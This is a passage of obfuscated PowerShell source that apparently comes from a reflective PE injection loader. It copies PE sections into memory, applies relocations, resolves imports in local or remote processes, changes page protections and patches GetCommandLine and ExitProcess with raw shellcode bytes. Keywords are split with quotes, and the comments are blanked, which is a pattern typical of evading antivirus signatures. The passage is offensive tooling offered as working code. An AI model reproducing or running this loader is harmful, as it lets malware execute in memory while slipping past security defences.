				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			## comment ; ##
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32F'u'N'c'T'i'O'n's.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	F'u'N'c'T'i'O'n' Update-MemoryAddresses
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[NotANumber(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true ## comment ; ##
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		## comment ; ##
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		## comment ; ##
		[IntPtr]$BaseRelocPtr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			## comment ; ##
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			## comment ; ##
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				## comment ; ##
				$RelocationInfoPtr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				## comment ; ##
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				## comment ; ##
				## comment ; ##
				## comment ; ##
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					## comment ; ##
					[IntPtr]$FinalAddr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					## comment ; ##
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	F'u'N'c'T'i'O'n' Import-DllImports
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32F'u'N'c'T'i'O'n's,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[NotANumber(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[NotANumber(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				## comment ; ##
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32F'u'N'c'T'i'O'n's.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				## comment ; ##
				[IntPtr]$ThunkRef = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) ## comment ; ##
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''
					## comment ; ##
					## comment ; ##
					## comment ; ##
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff ## comment ; ##
					}
					else
					{
						[IntPtr]$StringAddr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -F'u'N'c'T'i'O'n'Name $ProcedureName
					}
					else
					{
						if($ProcedureName -is [string])
						{
						    [IntPtr]$NewThunkRef = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
						}
						else
						{
						    [IntPtr]$NewThunkRef = $Win32F'u'N'c'T'i'O'n's.GetProcAddressOrdinal.Invoke($ImportDllHandle, $ProcedureName)
						}
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw "New F'u'N'c'T'i'O'n' reference is null, this is almost certainly a bug in this script. F'u'N'c'T'i'O'n': $ProcedureName. Dll: $ImportDllPath"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				
				$ImportDescriptorPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	F'u'N'c'T'i'O'n' Get-VirtualProtectValue
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	F'u'N'c'T'i'O'n' Update-MemoryProtectionFlags
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32F'u'N'c'T'i'O'n's,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[NotANumber(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	## comment ; ##
	## comment ; ##
	F'u'N'c'T'i'O'n' Update-ExeF'u'N'c'T'i'O'n's
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32F'u'N'c'T'i'O'n's,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[NotANumber(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[NotANumber(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		## comment ; ##
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32F'u'N'c'T'i'O'n's.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32F'u'N'c'T'i'O'n's.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		## comment ; ##
		## comment ; ##
		## comment ; ##
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		}

		## comment ; ##
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	## comment ; ##
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		## comment ; ##
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32F'u'N'c'T'i'O'n's.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32F'u'N'c'T'i'O'n's.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		## comment ; ##
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $GetCommandLineAAddrTemp $PtrSize
		w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		## comment ; ##
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $GetCommandLineWAddrTemp $PtrSize
		w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		## comment ; ##
		
		
		## comment ; ##
		## comment ; ##
		## comment ; ##
		## comment ; ##
		## comment ; ##
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32F'u'N'c'T'i'O'n's.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				## comment ; ##
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		## comment ; ##
		
		
		## comment ; ##
		## comment ; ##

		$ReturnArray = @()
		$ExitF'u'N'c'T'i'O'n's = @() ## comment ; ##
		
		## comment ; ##
		[IntPtr]$MscoreeHandle = $Win32F'u'N'c'T'i'O'n's.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitF'u'N'c'T'i'O'n's += $CorExitProcessAddr
		
		## comment ; ##
		[IntPtr]$ExitProcessAddr = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitF'u'N'c'T'i'O'n's += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitF'u'N'c'T'i'O'n'Addr in $ExitF'u'N'c'T'i'O'n's)
		{
			$ProcExitF'u'N'c'T'i'O'n'AddrTmp = $ProcExitF'u'N'c'T'i'O'n'Addr
			## comment ; ##
			## comment ; ##
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			## comment ; ##
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($ProcExitF'u'N'c'T'i'O'n'Addr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			## comment ; ##
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32F'u'N'c'T'i'O'n's.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitF'u'N'c'T'i'O'n'Addr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitF'u'N'c'T'i'O'n'Addr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			## comment ; ##
			## comment ; ##
			w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $Shellcode1 -MemoryAddress $ProcExitF'u'N'c'T'i'O'n'AddrTmp
			$ProcExitF'u'N'c'T'i'O'n'AddrTmp = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $ProcExitF'u'N'c'T'i'O'n'AddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitF'u'N'c'T'i'O'n'AddrTmp, $false)
			$ProcExitF'u'N'c'T'i'O'n'AddrTmp = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $ProcExitF'u'N'c'T'i'O'n'AddrTmp $PtrSize
			w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $Shellcode2 -MemoryAddress $ProcExitF'u'N'c'T'i'O'n'AddrTmp
			$ProcExitF'u'N'c'T'i'O'n'AddrTmp = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $ProcExitF'u'N'c'T'i'O'n'AddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitF'u'N'c'T'i'O'n'AddrTmp, $false)
			$ProcExitF'u'N'c'T'i'O'n'AddrTmp = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $ProcExitF'u'N'c'T'i'O'n'AddrTmp $PtrSize
			w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $Shellcode3 -MemoryAddress $ProcExitF'u'N'c'T'i'O'n'AddrTmp

			$Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($ProcExitF'u'N'c'T'i'O'n'Addr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		## comment ; ##

		W'r'i't'e'-'O'u't'p'u't' $ReturnArray
	}
	
	
	## comment ; ##
	## comment ; ##
	F'u'N'c'T'i'O'n' Copy-ArrayOfMemAddresses
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32F'u'N'c'T'i'O'n's,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
